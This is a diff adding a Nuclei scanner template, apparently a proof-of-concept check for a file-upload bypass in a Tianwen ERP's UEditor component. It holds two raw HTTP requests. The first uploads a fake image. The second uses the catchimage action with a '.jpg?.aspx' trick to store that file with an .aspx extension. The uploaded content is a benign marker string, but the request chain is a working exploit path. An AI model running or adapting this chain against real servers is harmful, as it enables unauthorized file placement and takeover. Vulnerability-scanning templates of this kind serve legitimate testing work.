@@ -1,0 +1,60 @@
+id: tianwenwuye-erp-ueditor-bypass-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 对于目标不出网的利用。
+  reference:
+    - https://forum.butian.net/share/2639
+  tags: tags
+variables:
+  randstring: "{{to_lower(rand_base(16))}}"
+  
+http:
+  - raw:
+      - |
+        POST /HM/M_main/Jscript-Ui/ueditor/net/controller.ashx?action=uploadimage HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
+        Connection: close
+        Content-Length: 203
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundary{{randstring}}
+        Content-Disposition: form-data; name="upfile"; filename="test.jpg"
+        Content-Type: Content-Type: image/png
+
+        GIF89a
+        1234567890
+        ------WebKitFormBoundary{{randstring}}--
+      - |-
+        POST /HM/M_main/Jscript-Ui/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 95
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: null
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        source[]=http://{{Hostname}}/HM/M_main/Jscript-Ui/ueditor/net/upload/image/{{path1}}.jpg?.aspx
+
+    extractors:
+      - type: regex
+        name: path1
+        group: 1
+        regex:
+           - '"url":"upload/image/(\d+)\.jpg'
+        internal: true
+
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.aspx'
